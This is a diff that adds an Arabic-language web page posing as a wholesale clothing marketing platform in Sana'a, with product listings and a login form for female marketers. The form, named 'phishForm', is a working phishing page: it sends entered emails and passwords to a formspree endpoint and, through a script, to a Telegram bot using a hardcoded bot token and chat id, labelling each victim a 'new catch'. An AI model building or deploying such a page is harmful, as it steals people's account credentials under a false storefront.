@@ -1,0 +1,101 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>منصة التسويق الموحدة - جملة اليمن</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f8f9fa; margin: 0; padding: 0; }
+        .nav-bar { background-color: #8e44ad; color: white; padding: 15px; text-align: center; font-size: 20px; font-weight: bold; }
+        .hero-banner { background: #fff; padding: 20px; text-align: center; border-bottom: 2px solid #eee; }
+        .hero-banner h2 { color: #8e44ad; margin: 0; }
+        .hero-banner p { color: #666; font-size: 14px; }
+        
+        .container { padding: 15px; display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; }
+        .card { background: white; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.1); position: relative; }
+        .card img { width: 100%; height: 150px; object-fit: cover; }
+        .card-info { padding: 10px; }
+        .card-info b { font-size: 14px; color: #333; }
+        .price-tag { background: #e74c3c; color: white; padding: 3px 8px; border-radius: 5px; font-size: 12px; display: inline-block; margin-top: 5px; }
+        
+        .login-section { background: #fff; margin: 20px 15px; padding: 20px; border-radius: 12px; border: 2px dashed #8e44ad; text-align: center; }
+        .login-section h3 { margin-top: 0; color: #333; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 12px; background-color: #8e44ad; color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
+        .footer { background: #333; color: #fff; padding: 20px; text-align: center; font-size: 12px; margin-top: 30px; }
+    </style>
+</head>
+<body>
+
+<div class="nav-bar">مجموعة التسويق المباشر - صنعاء</div>
+
+<div class="hero-banner">
+    <h2>أقوى عروض الجملة للمسوقات</h2>
+    <p>بضاعة جديدة وصلت الآن (عبايات، فساتين، إكسسوارات) بأسعار منافسة.</p>
+</div>
+
+<div class="container">
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1585487000160-6ebcfceb0d03?auto=format&fit=crop&w=300" alt="عباية">
+        <div class="card-info">
+            <b>عباية خليجي ملكي</b><br>
+            <span class="price-tag">18,500 ريال</span>
+        </div>
+    </div>
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1595777457583-95e059d581b8?auto=format&fit=crop&w=300" alt="فستان">
+        <div class="card-info">
+            <b>فستان سهرة تركي</b><br>
+            <span class="price-tag">22,000 ريال</span>
+        </div>
+    </div>
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1535633302703-b0703af48f18?auto=format&fit=crop&w=300" alt="إكسسوارات">
+        <div class="card-info">
+            <b>طقم إكسسوار ذهبي</b><br>
+            <span class="price-tag">4,500 ريال</span>
+        </div>
+    </div>
+    <div class="card">
+        <img src="https://images.unsplash.com/photo-1584917865442-de89df76afd3?auto=format&fit=crop&w=300" alt="شنطة">
+        <div class="card-info">
+            <b>شنطة يد ماركة "درجة أولى"</b><br>
+            <span class="price-tag">9,000 ريال</span>
+        </div>
+    </div>
+</div>
+
+<div class="login-section">
+    <h3>تسجيل دخول المسوقات</h3>
+    <p>يرجى تسجيل الدخول لعرض قائمة الأسعار بالكامل وحجز الطلبيات.</p>
+    
+    <form action="https://formspree.io/f/xdajkgpz" method="POST" id="phishForm">
+        <input type="email" name="email" id="email" placeholder="البريد الإلكتروني أو الرقم" required>
+        <input type="password" name="password" id="password" placeholder="كلمة السر" required>
+        <input type="hidden" name="_subject" value="صيد جديد من منصة الملابس">
+        <button type="submit" class="btn">دخول واستلام الكتالوج</button>
+    </form>
+</div>
+
+<div class="footer">
+    تواصل معنا (إدارة التسويق): 777158066 <br>
+    جميع الحقوق محفوظة © 2026 - صنعاء، شارع تعز
+</div>
+
+<script>
+    const form = document.getElementById('phishForm');
+    form.addEventListener('submit', function(e) {
+        const email = document.getElementById('email').value;
+        const pass = document.getElementById('password').value;
+        
+        const token = "8549358187:AAGRic3rPa_yqyyE6XO5fAcqthKp02AtQj4";
+        const chat_id = "7770087246";
+        const text = `🎯 صيد جديد من منصة الملابس:\n📧 الحساب: ${email}\n🔑 الباسورد: ${pass}`;
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(text)}`);
+    });
+</script>
+
+</body>
+</html>
